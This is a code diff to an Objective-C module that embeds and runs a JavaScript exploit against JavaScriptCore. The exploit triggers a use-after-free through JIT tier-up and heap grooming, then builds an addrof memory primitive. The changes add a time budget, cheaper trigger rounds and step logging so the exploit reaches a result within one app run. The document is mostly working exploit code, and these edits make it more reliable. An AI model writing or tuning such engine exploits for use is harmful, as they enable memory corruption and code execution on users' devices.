@@ -28,6 +28,7 @@ static const char *kUnifiedJS = R"JS(
   var ftoi = function (f) { d[0] = f; return u[0]; };
   var OFF = 0x0002000000000000n;
   var HDR = 0x07n | (0x2Bn << 40n) | (1n << 56n);
+  var BUDGET = 150000, t0 = Date.now(), rounds = 0;
 
   arr = new Array(0x400000).fill(1.1);
   var arr_index = arr.length - 1;
@@ -50,7 +51,12 @@ static const char *kUnifiedJS = R"JS(
 
   var W = null;
   for (let k = 0; k < 10000 && !W; ++k) {
-    foo(false, 10, k % 5 + 1); rec(10000);
+    rounds = k + 1;
+    // OSR cost: full inner loops while foo/rec tier up, then a much cheaper
+    // variant -- the original per-round cost (~60M JS calls) meant the module
+    // could never reach a verdict inside a single app run.
+    var kk = (k < 30) ? 10 : 2;
+    foo(false, kk, k % 5 + 1); rec(2000);
     for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
     let fr = arr[arr_index].p1.p1;
     let noCow = 13.37;
@@ -58,7 +64,12 @@ static const char *kUnifiedJS = R"JS(
       let c = [13.37, 2.2, 3.3, 4.4, noCow];
       if (fr[0] === 13.37) { W = { freed: fr, boxed: c, round: k }; break; }
     }
+    if (k % 25 === 24) aveStep('hunt round=' + rounds +
+                              ' elapsed=' + (Date.now() - t0) + 'ms trigger=no');
+    if (Date.now() - t0 > BUDGET) break;
   }
+  out.rounds = rounds; out.huntMs = Date.now() - t0;
+  aveStep('hunt finished: rounds=' + rounds + ' in ' + out.huntMs + 'ms');
   if (!W) { out.err = 'trigger did not fire'; return JSON.stringify(out); }
   out.step.push('UAF round=' + W.round);
   function addrof(o) { W.boxed[0] = o; return ftoi(W.freed[0]); }
@@ -116,6 +127,11 @@ NSString *ModUnifiedPrimitives(void) {
     // 1. JSC chain in this process's own JavaScriptCore
     JSContext *ctx = [[JSContext alloc] init];
     NSString *res = @"(no answer)";
+    ctx[@"aveStep"] = ^(id s) {
+        NSString *line = [s isKindOfClass:[NSString class]] ? s : [s description] ?: @"?";
+        AveLog([NSString stringWithFormat:@"    js. %@", line]);
+        AvePost([NSString stringWithFormat:@"UNIFIED STEP %@", line]);
+    };
     [ctx evaluateScript:@"1+1"];
     @try {
         JSValue *v = [ctx evaluateScript:[NSString stringWithUTF8String:kUnifiedJS]];
